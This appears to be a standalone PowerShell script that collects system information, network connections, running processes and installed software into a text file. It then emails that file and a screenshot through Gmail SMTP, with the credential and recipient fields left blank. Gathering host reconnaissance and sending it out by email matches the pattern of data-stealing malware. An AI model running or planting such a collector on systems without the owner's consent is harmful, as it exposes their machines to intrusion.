systeminfo /s LOCALHOST | Out-File output.txt
netstat -a -n -o | Out-File output.txt -append
tasklist | Out-File output.txt -append
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File output.txt -append

$user = ""
$password = ""

$EmailTo = ""
$EmailFrom = ""
$AttachPath = ".\output.txt"
$ScreenPath = ".\screenshot.png"
$time = Get-Date -format "dd-MMM-yyyy HH:mm"

$MailMessage = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo)
$MailMessage.Subject = "Report: $time"
$MailMessage.Body = ""
$Attachment = New-Object System.Net.Mail.Attachment($AttachPath, 'text/plain')
$Screenshot = New-Object System.Net.Mail.Attachment($ScreenPath, 'image/png')
$MailMessage.Attachments.Add($Attachment)
$MailMessage.Attachments.Add($ScreenPath)

$SMTPServer = "smtp.gmail.com"
$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer,587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($user,$password)
$SMTPClient.Send($MailMessage)